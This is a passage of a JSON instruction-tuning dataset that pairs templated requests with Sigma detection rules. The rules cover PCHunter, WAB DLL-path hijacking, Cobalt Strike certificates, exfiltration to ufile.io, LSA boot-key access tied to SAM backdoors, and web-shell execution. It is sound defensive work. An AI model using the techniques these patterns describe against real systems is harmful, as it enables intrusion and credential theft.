    "instruction": "Build a Sigma rule with the goal of detecting suspicious use of PCHunter, a tool like Process Hacker to view and manipulate processes, kernel options and other low level stuff.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious use of PCHunter, a tool like Process Hacker to view and manipulate processes, kernel options, and other low-level stuff, you should monitor Windows process creation logs for instances where processes match specific patterns indicating the use of PCHunter. Look for processes that have been created with the image names ending in '\\PCHunter64.exe' or '\\PCHunter32.exe'. Additionally, pay attention to processes that contain certain properties, such as files named 'PCHunter.exe' or those described as 'Epoolsoft Windows Information View Tools'. Moreover, it is critical to scrutinize processes with specific hash values, which include a variety of SHA1, MD5, SHA256, and IMPHASH identifiers such as '5F1CBC3D99558307BC1250D084FA968521482025', '987B65CD9B9F4E9A1AFD8F8B48CF64A7', '2B214BDDAAB130C274DE6204AF6DBA5AEEC7433DA99AA950022FA306421A6D32', among others listed. These characteristics strongly indicate the execution or manipulation of processes using the PCHunter tool, which can be an essential part of diagnosing or intervening in potentially malicious activity aimed at manipulating system processes or obtaining sensitive information at a low level. It is important to note that false positives are unlikely, indicating that detection of these specific patterns should be treated with high priority and investigated accordingly.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_image:\n        Image|endswith:\n            - '\\PCHunter64.exe'\n            - '\\PCHunter32.exe'\n    selection_pe:\n        - OriginalFileName: 'PCHunter.exe'\n        - Description: 'Epoolsoft Windows Information View Tools'\n    selection_hashes:\n        Hashes|contains:\n            - 'SHA1=5F1CBC3D99558307BC1250D084FA968521482025'\n            - 'MD5=987B65CD9B9F4E9A1AFD8F8B48CF64A7'\n            - 'SHA256=2B214BDDAAB130C274DE6204AF6DBA5AEEC7433DA99AA950022FA306421A6D32'\n            - 'IMPHASH=444D210CEA1FF8112F256A4997EED7FF'\n            - 'SHA1=3FB89787CB97D902780DA080545584D97FB1C2EB'\n            - 'MD5=228DD0C2E6287547E26FFBD973A40F14'\n            - 'SHA256=55F041BF4E78E9BFA6D4EE68BE40E496CE3A1353E1CA4306598589E19802522C'\n            - 'IMPHASH=0479F44DF47CFA2EF1CCC4416A538663'\n    selection_hash_values:\n        - md5:\n            - '228dd0c2e6287547e26ffbd973a40f14'\n            - '987b65cd9b9f4e9a1afd8f8b48cf64a7'\n        - sha1:\n            - '5f1cbc3d99558307bc1250d084fa968521482025'\n            - '3fb89787cb97d902780da080545584d97fb1c2eb'\n        - sha256:\n            - '2b214bddaab130c274de6204af6dba5aeec7433da99aa950022fa306421a6d32'\n            - '55f041bf4e78e9bfa6d4ee68be40e496ce3a1353e1ca4306598589e19802522c'\n        - Imphash:\n            - '444d210cea1ff8112f256a4997eed7ff'\n            - '0479f44df47cfa2ef1ccc4416a538663'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_image:\n        Image|endswith:\n            - '\\PCHunter64.exe'\n            - '\\PCHunter32.exe'\n    selection_pe:\n        - OriginalFileName: 'PCHunter.exe'\n        - Description: 'Epoolsoft Windows Information View Tools'\n    selection_hashes:\n        Hashes|contains:\n            - 'SHA1=5F1CBC3D99558307BC1250D084FA968521482025'\n            - 'MD5=987B65CD9B9F4E9A1AFD8F8B48CF64A7'\n            - 'SHA256=2B214BDDAAB130C274DE6204AF6DBA5AEEC7433DA99AA950022FA306421A6D32'\n            - 'IMPHASH=444D210CEA1FF8112F256A4997EED7FF'\n            - 'SHA1=3FB89787CB97D902780DA080545584D97FB1C2EB'\n            - 'MD5=228DD0C2E6287547E26FFBD973A40F14'\n            - 'SHA256=55F041BF4E78E9BFA6D4EE68BE40E496CE3A1353E1CA4306598589E19802522C'\n            - 'IMPHASH=0479F44DF47CFA2EF1CCC4416A538663'\n    selection_hash_values:\n        - md5:\n            - '228dd0c2e6287547e26ffbd973a40f14'\n            - '987b65cd9b9f4e9a1afd8f8b48cf64a7'\n        - sha1:\n            - '5f1cbc3d99558307bc1250d084fa968521482025'\n            - '3fb89787cb97d902780da080545584d97fb1c2eb'\n        - sha256:\n            - '2b214bddaab130c274de6204af6dba5aeec7433da99aa950022fa306421a6d32'\n            - '55f041bf4e78e9bfa6d4ee68be40e496ce3a1353e1ca4306598589e19802522c'\n        - Imphash:\n            - '444d210cea1ff8112f256a4997eed7ff'\n            - '0479f44df47cfa2ef1ccc4416a538663'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "suspicious use of PCHunter, a tool like Process Hacker to view and manipulate processes, kernel options and other low level stuff",
      "answer": "In order to detect suspicious use of PCHunter, a tool like Process Hacker to view and manipulate processes, kernel options, and other low-level stuff, you should monitor Windows process creation logs for instances where processes match specific patterns indicating the use of PCHunter. Look for processes that have been created with the image names ending in '\\PCHunter64.exe' or '\\PCHunter32.exe'. Additionally, pay attention to processes that contain certain properties, such as files named 'PCHunter.exe' or those described as 'Epoolsoft Windows Information View Tools'. Moreover, it is critical to scrutinize processes with specific hash values, which include a variety of SHA1, MD5, SHA256, and IMPHASH identifiers such as '5F1CBC3D99558307BC1250D084FA968521482025', '987B65CD9B9F4E9A1AFD8F8B48CF64A7', '2B214BDDAAB130C274DE6204AF6DBA5AEEC7433DA99AA950022FA306421A6D32', among others listed. These characteristics strongly indicate the execution or manipulation of processes using the PCHunter tool, which can be an essential part of diagnosing or intervening in potentially malicious activity aimed at manipulating system processes or obtaining sensitive information at a low level. It is important to note that false positives are unlikely, indicating that detection of these specific patterns should be treated with high priority and investigated accordingly."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting that the path to the DLL written in the registry is different from the default one. Launched WAB.exe tries to load the DLL from Registry..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect that the path to the DLL written in the registry is different from the default one when WAB.exe tries to load the DLL from Registry, you should:\n\nMonitor the Windows system for registry settings modifications, specifically focusing on events where there's a change in the values set under the registry path associated with the Windows Address Book (WAB) application. Look for events categorized under registry modifications (registry_set) with an event type of SetValue that indicates a new value assignment within the registry. This monitoring should narrowly focus on changes to the '\\Software\\Microsoft\\WAB\\DLLPath' within the registry. It's crucial to filter out and ignore modifications where the DLL path points to the default '%CommonProgramFiles%\\System\\wab32.dll' to reduce false positives, thereby concentrating on non-standard or potentially malicious changes. This approach helps in identifying scenarios where an attacker might attempt to divert the standard DLL loading process to a malicious DLL, a common technique in persistence mechanisms and method of attack execution by loading unauthorized or malicious code. Implementing such monitoring ensures a high level of scrutiny in detecting anomalies in modifications of the registry paths that are critical to the loading of legitimate software, such as the WAB application. This monitoring strategy is aimed at addressing tactics and techniques that involve Persistence, Privilege Escalation, and Defense Evasion, by noting unusual changes in DLL path settings in the Windows registry.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|endswith: '\\Software\\Microsoft\\WAB\\DLLPath'\n    filter:\n        Details: '%CommonProgramFiles%\\System\\wab32.dll'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|endswith: '\\Software\\Microsoft\\WAB\\DLLPath'\n    filter:\n        Details: '%CommonProgramFiles%\\System\\wab32.dll'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "that the path to the DLL written in the registry is different from the default one. Launched WAB.exe tries to load the DLL from Registry.",
      "answer": "In order to detect that the path to the DLL written in the registry is different from the default one when WAB.exe tries to load the DLL from Registry, you should:\n\nMonitor the Windows system for registry settings modifications, specifically focusing on events where there's a change in the values set under the registry path associated with the Windows Address Book (WAB) application. Look for events categorized under registry modifications (registry_set) with an event type of SetValue that indicates a new value assignment within the registry. This monitoring should narrowly focus on changes to the '\\Software\\Microsoft\\WAB\\DLLPath' within the registry. It's crucial to filter out and ignore modifications where the DLL path points to the default '%CommonProgramFiles%\\System\\wab32.dll' to reduce false positives, thereby concentrating on non-standard or potentially malicious changes. This approach helps in identifying scenarios where an attacker might attempt to divert the standard DLL loading process to a malicious DLL, a common technique in persistence mechanisms and method of attack execution by loading unauthorized or malicious code. Implementing such monitoring ensures a high level of scrutiny in detecting anomalies in modifications of the registry paths that are critical to the loading of legitimate software, such as the WAB application. This monitoring strategy is aimed at addressing tactics and techniques that involve Persistence, Privilege Escalation, and Defense Evasion, by noting unusual changes in DLL path settings in the Windows registry."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting presence of default Cobalt Strike certificate in the HTTPS traffic.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the presence of default Cobalt Strike certificate in the HTTPS traffic, you should: Monitor HTTPS traffic for specific certificate characteristics using Zeek, focusing on the X509 service logs. Pay attention to certificates with the serial number \"8BB00EE\". This indicator can help identify potentially malicious activity related to Cobalt Strike, a common tool used in cyber attacks for establishing encrypted command and control channels. You will need to examine fields such as the DNS names included in the Subject Alternative Name (SAN) field, the certificate's subject, and issuer details to provide more context around the detected certificate. Be aware that there may be instances where this detection could trigger on non-malicious activity, although such false positives are currently unknown. This activity is characterized by a high level of confidence due to its specificity. By focusing on these details and logs from Zeek's X509 service, defenders can more effectively identify and respond to potential Cobalt Strike command and control communication within their networks.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: zeek\n    service: x509\ndetection:\n    selection:\n        certificate.serial: 8BB00EE\n    condition: selection\nfields:\n    - san.dns\n    - certificate.subject\n    - certificate.issuer\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: zeek\n    service: x509\ndetection:\n    selection:\n        certificate.serial: 8BB00EE\n    condition: selection\nfields:\n    - san.dns\n    - certificate.subject\n    - certificate.issuer\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "presence of default Cobalt Strike certificate in the HTTPS traffic",
      "answer": "In order to detect the presence of default Cobalt Strike certificate in the HTTPS traffic, you should: Monitor HTTPS traffic for specific certificate characteristics using Zeek, focusing on the X509 service logs. Pay attention to certificates with the serial number \"8BB00EE\". This indicator can help identify potentially malicious activity related to Cobalt Strike, a common tool used in cyber attacks for establishing encrypted command and control channels. You will need to examine fields such as the DNS names included in the Subject Alternative Name (SAN) field, the certificate's subject, and issuer details to provide more context around the detected certificate. Be aware that there may be instances where this detection could trigger on non-malicious activity, although such false positives are currently unknown. This activity is characterized by a high level of confidence due to its specificity. By focusing on these details and logs from Zeek's X509 service, defenders can more effectively identify and respond to potential Cobalt Strike command and control communication within their networks."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting DNS queries to \"ufile.io\". Which is often abused by malware for upload and exfiltration.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect DNS queries to \"ufile.io\", which is often abused by malware for upload and exfiltration, you should focus on monitoring DNS client events within Windows environments. This involves ensuring that the Microsoft-Windows-DNS Client Events/Operational Event Log is enabled and collected. Specifically, look for events with an EventID of 3008, which indicate DNS queries. Within these events, pay close attention to queries that contain the domain 'ufile.io', as this is a known vector for malicious activity, specifically related to malware's use of the domain for uploading and exfiltrating data. However, it's important to consider that there can be legitimate DNS queries and usages of Ufile, which are identified as potential false positives in analyzing these events. The level of concern for such detections is categorized as high, underlining the importance and potential severity associated with these activities. \n\nMonitoring for these specific DNS query events will aid in identifying possible malicious activities related to common tactics and techniques used by adversaries, such as \"Exfiltration Over Command and Control Channel\". This aligns with understanding and mitigating threats that leverage DNS queries to domains known for malicious use, thus enhancing the security posture against such malware-related activities.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: dns-client\n    definition: 'Requirements: Microsoft-Windows-DNS Client Events/Operational Event Log must be enabled/collected in order to receive the events.'\ndetection:\n    selection:\n        EventID: 3008\n        QueryName|contains: 'ufile.io'\n    condition: selection\nfalsepositives:\n    - Legitimate DNS queries and usage of Ufile\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: dns-client\n    definition: 'Requirements: Microsoft-Windows-DNS Client Events/Operational Event Log must be enabled/collected in order to receive the events.'\ndetection:\n    selection:\n        EventID: 3008\n        QueryName|contains: 'ufile.io'\n    condition: selection\nfalsepositives:\n    - Legitimate DNS queries and usage of Ufile\nlevel: high\n",
      "question": "DNS queries to \"ufile.io\". Which is often abused by malware for upload and exfiltration",
      "answer": "In order to detect DNS queries to \"ufile.io\", which is often abused by malware for upload and exfiltration, you should focus on monitoring DNS client events within Windows environments. This involves ensuring that the Microsoft-Windows-DNS Client Events/Operational Event Log is enabled and collected. Specifically, look for events with an EventID of 3008, which indicate DNS queries. Within these events, pay close attention to queries that contain the domain 'ufile.io', as this is a known vector for malicious activity, specifically related to malware's use of the domain for uploading and exfiltrating data. However, it's important to consider that there can be legitimate DNS queries and usages of Ufile, which are identified as potential false positives in analyzing these events. The level of concern for such detections is categorized as high, underlining the importance and potential severity associated with these activities. \n\nMonitoring for these specific DNS query events will aid in identifying possible malicious activities related to common tactics and techniques used by adversaries, such as \"Exfiltration Over Command and Control Channel\". This aligns with understanding and mitigating threats that leverage DNS queries to domains known for malicious use, thus enhancing the security posture against such malware-related activities."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting WMI command line event consumers.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect WMI command line event consumers, you should: Monitor for specific images being loaded in the Windows operating system, particularly focusing on the image loading events related to \"C:\\Windows\\System32\\wbem\\WmiPrvSE.exe\". Additionally, pay close attention to instances where 'wbemcons.dll' is loaded by any process, indicated by the ending of the loaded image path. This behavior can point towards the execution or utilization of Windows Management Instrumentation (WMI) for potentially malicious purposes, often associated with surveillance or automation of tasks that could be leveraged by an attacker. Be aware, however, that due to the novelty and complexity of this detection method, there might be unknown false positives, indicating a necessity for further data analysis and testing. The associated threat level with this type of detection is classified as high, reflecting the malicious potential of abusing WMI components.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: image_load\n    product: windows\ndetection:\n    selection:\n        Image: 'C:\\Windows\\System32\\wbem\\WmiPrvSE.exe'\n        ImageLoaded|endswith: '\\wbemcons.dll'\n    condition: selection\nfalsepositives:\n    - Unknown (data set is too small; further testing needed)\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: image_load\n    product: windows\ndetection:\n    selection:\n        Image: 'C:\\Windows\\System32\\wbem\\WmiPrvSE.exe'\n        ImageLoaded|endswith: '\\wbemcons.dll'\n    condition: selection\nfalsepositives:\n    - Unknown (data set is too small; further testing needed)\nlevel: high\n",
      "question": "WMI command line event consumers",
      "answer": "In order to detect WMI command line event consumers, you should: Monitor for specific images being loaded in the Windows operating system, particularly focusing on the image loading events related to \"C:\\Windows\\System32\\wbem\\WmiPrvSE.exe\". Additionally, pay close attention to instances where 'wbemcons.dll' is loaded by any process, indicated by the ending of the loaded image path. This behavior can point towards the execution or utilization of Windows Management Instrumentation (WMI) for potentially malicious purposes, often associated with surveillance or automation of tasks that could be leveraged by an attacker. Be aware, however, that due to the novelty and complexity of this detection method, there might be unknown false positives, indicating a necessity for further data analysis and testing. The associated threat level with this type of detection is classified as high, reflecting the malicious potential of abusing WMI components."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting usage of certain functions and keywords that are used to manipulate security descriptors in order to potentially set a backdoor. As seen used in the DAMP project..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect usage of certain functions and keywords that are used to manipulate security descriptors in order to potentially set a backdoor, as seen used in the DAMP project, you should: Focus on the monitoring of PowerShell scripts within Windows environments by ensuring that Script Block Logging is enabled. Specifically, watch for scripts that contain the terms 'win32_Trustee', 'win32_Ace', '.AccessMask', '.AceType', and '.SetSecurityDescriptor'. These terms are indicative of actions taken to manipulate security descriptors. Additionally, the presence of strings such as '\\Lsa\\JD', '\\Lsa\\Skew1', '\\Lsa\\Data', '\\Lsa\\GBG' within the scripts should also raise alerts. These are associated with attempts to interact with or manipulate Windows Security Accounts Manager (SAM) database files, potentially to create backdoors. Given the sophisticated nature of these techniques, this monitoring approach is set to a high alert level due to the rarity and potential impact of such actions, although it acknowledges the possibility of unknown false positives.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains|all:\n            - 'win32_Trustee'\n            - 'win32_Ace'\n            - '.AccessMask'\n            - '.AceType'\n            - '.SetSecurityDescriptor'\n        ScriptBlockText|contains:\n            - '\\Lsa\\JD'\n            - '\\Lsa\\Skew1'\n            - '\\Lsa\\Data'\n            - '\\Lsa\\GBG'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains|all:\n            - 'win32_Trustee'\n            - 'win32_Ace'\n            - '.AccessMask'\n            - '.AceType'\n            - '.SetSecurityDescriptor'\n        ScriptBlockText|contains:\n            - '\\Lsa\\JD'\n            - '\\Lsa\\Skew1'\n            - '\\Lsa\\Data'\n            - '\\Lsa\\GBG'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "usage of certain functions and keywords that are used to manipulate security descriptors in order to potentially set a backdoor. As seen used in the DAMP project.",
      "answer": "In order to detect usage of certain functions and keywords that are used to manipulate security descriptors in order to potentially set a backdoor, as seen used in the DAMP project, you should: Focus on the monitoring of PowerShell scripts within Windows environments by ensuring that Script Block Logging is enabled. Specifically, watch for scripts that contain the terms 'win32_Trustee', 'win32_Ace', '.AccessMask', '.AceType', and '.SetSecurityDescriptor'. These terms are indicative of actions taken to manipulate security descriptors. Additionally, the presence of strings such as '\\Lsa\\JD', '\\Lsa\\Skew1', '\\Lsa\\Data', '\\Lsa\\GBG' within the scripts should also raise alerts. These are associated with attempts to interact with or manipulate Windows Security Accounts Manager (SAM) database files, potentially to create backdoors. Given the sophisticated nature of these techniques, this monitoring approach is set to a high alert level due to the rarity and potential impact of such actions, although it acknowledges the possibility of unknown false positives."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting possible command execution by web application/web shell.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect possible command execution by a web application/web shell, you should focus on setting up monitoring for specific system calls indicative of this type of activity on Linux systems using the Audit daemon (auditd). Specifically, pay attention to the execution system call (execve) made by the web server's user account, typically 'www-data' which, by default, has the user ID 33. This monitoring is established by adding rules to your auditd configuration that target both 32-bit and 64-bit architectures. These rules should be set to always trigger on the 'exit' action of the execve system call made by the effective user ID (euid) corresponding to your web server user. \n\nYou should tag and categorize these detection logs with a distinctive key, such as 'detect_execve_www', to facilitate their identification. Be aware that not all instances flagged by these monitoring rules are malicious. Legitimate administration activity or non-standard behavior by web applications may also trigger these alerts. Due to the critical nature of detecting unauthorized command execution, the level of concern for these detections is considered critical. This approach aligns with tactics commonly associated with the initiation and execution phases of an attack, where malicious commands may be executed on a server to either gain an initial foothold or move laterally within an environment.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: linux\n    service: auditd\ndetection:\n    selection:\n        # You need to add to the following rules to your auditd.conf config:\n        #   -a always,exit -F arch=b32 -S execve -F euid=33 -k detect_execve_www\n        #   -a always,exit -F arch=b64 -S execve -F euid=33 -k detect_execve_www\n        # Change the number \"33\" to the ID of your WebServer user. Default: www-data:x:33:33\n        type: 'SYSCALL'\n        syscall: 'execve'\n        key: 'detect_execve_www'\n    condition: selection\nfalsepositives:\n    - Admin activity\n    - Crazy web applications\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: linux\n    service: auditd\ndetection:\n    selection:\n        # You need to add to the following rules to your auditd.conf config:\n        #   -a always,exit -F arch=b32 -S execve -F euid=33 -k detect_execve_www\n        #   -a always,exit -F arch=b64 -S execve -F euid=33 -k detect_execve_www\n        # Change the number \"33\" to the ID of your WebServer user. Default: www-data:x:33:33\n        type: 'SYSCALL'\n        syscall: 'execve'\n        key: 'detect_execve_www'\n    condition: selection\nfalsepositives:\n    - Admin activity\n    - Crazy web applications\nlevel: critical\n",
      "question": "possible command execution by web application/web shell",
      "answer": "In order to detect possible command execution by a web application/web shell, you should focus on setting up monitoring for specific system calls indicative of this type of activity on Linux systems using the Audit daemon (auditd). Specifically, pay attention to the execution system call (execve) made by the web server's user account, typically 'www-data' which, by default, has the user ID 33. This monitoring is established by adding rules to your auditd configuration that target both 32-bit and 64-bit architectures. These rules should be set to always trigger on the 'exit' action of the execve system call made by the effective user ID (euid) corresponding to your web server user. \n\nYou should tag and categorize these detection logs with a distinctive key, such as 'detect_execve_www', to facilitate their identification. Be aware that not all instances flagged by these monitoring rules are malicious. Legitimate administration activity or non-standard behavior by web applications may also trigger these alerts. Due to the critical nature of detecting unauthorized command execution, the level of concern for these detections is considered critical. This approach aligns with tactics commonly associated with the initiation and execution phases of an attack, where malicious commands may be executed on a server to either gain an initial foothold or move laterally within an environment."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting certificate creation with template allowing risk permission subject and risky EKU.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect certificate creation with a template allowing risk permission subject and risky EKU, you should monitor Windows Security logs for specific events that indicate the loading or updating of certificate templates that contain potentially risky attributes. Specifically, keep an eye out for event ID 4898, which signifies that certificate services loaded a template, and event ID 4899, which indicates that a certificate services template was updated. These events become noteworthy if the templates include certain flags or Enhanced Key Usage (EKU) values considered risky. The EKU values to watch for include '1.3.6.1.5.5.7.3.2' (Client Authentication), '1.3.6.1.5.2.3.4', '1.3.6.1.4.1.311.20.2.2' (Smart Card Logon), and '2.5.29.37.0' (Any Purpose). Additionally, the presence of the 'CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT' flag in the template content (for both loading and updating scenarios) raises concerns about the security of the certificate being created or updated. This flag indicates that the subject of the certificate can be supplied by the enrollee, potentially allowing for misrepresentation or misuse.\n\nIt's important to consider that activities such as legitimate administrative actions, the use of proxy SSL certificates with subject modification, and smart card enrollment might generate similar logs and thus could be mistaken for malicious activity. These scenarios are acknowledged as potential false positives, highlighting the need for thorough investigation of each case. The detection of these events is of high importance given the potential security implications of issuing certificates that grant risk permissions or that utilize risky EKU values.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: security\n    definition: Certificate services loaded a template would trigger event ID 4898 and certificate Services template was updated would trigger event ID 4899. A risk permission seems to be coming if template contain specific flag with risky EKU.\ndetection:\n    selection10:\n        EventID: 4898\n        TemplateContent|contains:\n            - '1.3.6.1.5.5.7.3.2'\n            - '1.3.6.1.5.2.3.4'\n            - '1.3.6.1.4.1.311.20.2.2'\n            - '2.5.29.37.0'\n    selection11:\n        TemplateContent|contains: 'CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT'\n\n    selection20:\n        EventID: 4899\n        NewTemplateContent|contains:\n            - '1.3.6.1.5.5.7.3.2'\n            - '1.3.6.1.5.2.3.4'\n            - '1.3.6.1.4.1.311.20.2.2'\n            - '2.5.29.37.0'\n    selection21:\n        NewTemplateContent|contains: 'CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT'\n\n    condition: (selection10 and selection11) or (selection20 and selection21)\nfalsepositives:\n    - Administrator activity\n    - Proxy SSL certificate with subject modification\n    - Smart card enrollement\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: security\n    definition: Certificate services loaded a template would trigger event ID 4898 and certificate Services template was updated would trigger event ID 4899. A risk permission seems to be coming if template contain specific flag with risky EKU.\ndetection:\n    selection10:\n        EventID: 4898\n        TemplateContent|contains:\n            - '1.3.6.1.5.5.7.3.2'\n            - '1.3.6.1.5.2.3.4'\n            - '1.3.6.1.4.1.311.20.2.2'\n            - '2.5.29.37.0'\n    selection11:\n        TemplateContent|contains: 'CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT'\n\n    selection20:\n        EventID: 4899\n        NewTemplateContent|contains:\n            - '1.3.6.1.5.5.7.3.2'\n            - '1.3.6.1.5.2.3.4'\n            - '1.3.6.1.4.1.311.20.2.2'\n            - '2.5.29.37.0'\n    selection21:\n        NewTemplateContent|contains: 'CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT'\n\n    condition: (selection10 and selection11) or (selection20 and selection21)\nfalsepositives:\n    - Administrator activity\n    - Proxy SSL certificate with subject modification\n    - Smart card enrollement\nlevel: high\n",
      "question": "certificate creation with template allowing risk permission subject and risky EKU",
      "answer": "In order to detect certificate creation with a template allowing risk permission subject and risky EKU, you should monitor Windows Security logs for specific events that indicate the loading or updating of certificate templates that contain potentially risky attributes. Specifically, keep an eye out for event ID 4898, which signifies that certificate services loaded a template, and event ID 4899, which indicates that a certificate services template was updated. These events become noteworthy if the templates include certain flags or Enhanced Key Usage (EKU) values considered risky. The EKU values to watch for include '1.3.6.1.5.5.7.3.2' (Client Authentication), '1.3.6.1.5.2.3.4', '1.3.6.1.4.1.311.20.2.2' (Smart Card Logon), and '2.5.29.37.0' (Any Purpose). Additionally, the presence of the 'CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT' flag in the template content (for both loading and updating scenarios) raises concerns about the security of the certificate being created or updated. This flag indicates that the subject of the certificate can be supplied by the enrollee, potentially allowing for misrepresentation or misuse.\n\nIt's important to consider that activities such as legitimate administrative actions, the use of proxy SSL certificates with subject modification, and smart card enrollment might generate similar logs and thus could be mistaken for malicious activity. These scenarios are acknowledged as potential false positives, highlighting the need for thorough investigation of each case. The detection of these events is of high importance given the potential security implications of issuing certificates that grant risk permissions or that utilize risky EKU values."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting usage of command line tools such as \"kill\", \"pkill\" or \"killall\" to terminate or signal a running process..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect usage of command line tools such as \"kill\", \"pkill\" or \"killall\" to terminate or signal a running process, you should: Monitor process creation logs on Linux systems for the execution of commands that include \"kill\", \"pkill\", or \"killall\" at the end of the command path. Be aware that there may be legitimate uses of these commands, so the likelihood of false positives is high and the detection level is considered low.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: linux\n    category: process_creation\ndetection:\n    selection:\n        Image|endswith:\n          - '/kill'\n          - '/pkill'\n          - '/killall'\n    condition: selection\nfalsepositives:\n    - Likely\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: linux\n    category: process_creation\ndetection:\n    selection:\n        Image|endswith:\n          - '/kill'\n          - '/pkill'\n          - '/killall'\n    condition: selection\nfalsepositives:\n    - Likely\nlevel: low\n",
      "question": "usage of command line tools such as \"kill\", \"pkill\" or \"killall\" to terminate or signal a running process.",
      "answer": "In order to detect usage of command line tools such as \"kill\", \"pkill\" or \"killall\" to terminate or signal a running process, you should: Monitor process creation logs on Linux systems for the execution of commands that include \"kill\", \"pkill\", or \"killall\" at the end of the command path. Be aware that there may be legitimate uses of these commands, so the likelihood of false positives is high and the detection level is considered low."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting addition of new root, CA or AuthRoot certificates to the Windows registry.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the addition of new root, CA or AuthRoot certificates to the Windows registry, you should monitor Windows registry settings specifically within the registry key categories associated with root, CA, or AuthRoot certificates. This involves tracking any SetValue events where TargetObject paths contain specific strings related to the system, policies, or enterprise certificates within the Root, CA, or AuthRoot directories. In more detail, lookout for changes in registry paths such as '\\SOFTWARE\\Microsoft\\SystemCertificates\\Root\\Certificates\\', '\\SOFTWARE\\Policies\\Microsoft\\SystemCertificates\\Root\\Certificates\\', and similar paths for CA and AuthRoot certificates. Additionally, ensure that these registry modifications end with '\\Blob' and involve binary data, as these attributes are indicative of certificate additions. This detection method is crucial for maintaining the integrity and security of the system's trust store, as unauthorized or malicious certificates can compromise secure communications and facilitate further attacks. It's categorized under medium severity due to the potential risk it represents, although it's noted that there may be unknown false positives. Keep an eye on these registry alterations to protect the system against unauthorized certificate injections, which are a part of several attack techniques like spoofing, man-in-the-middle attacks, and more.",
    "context": "",
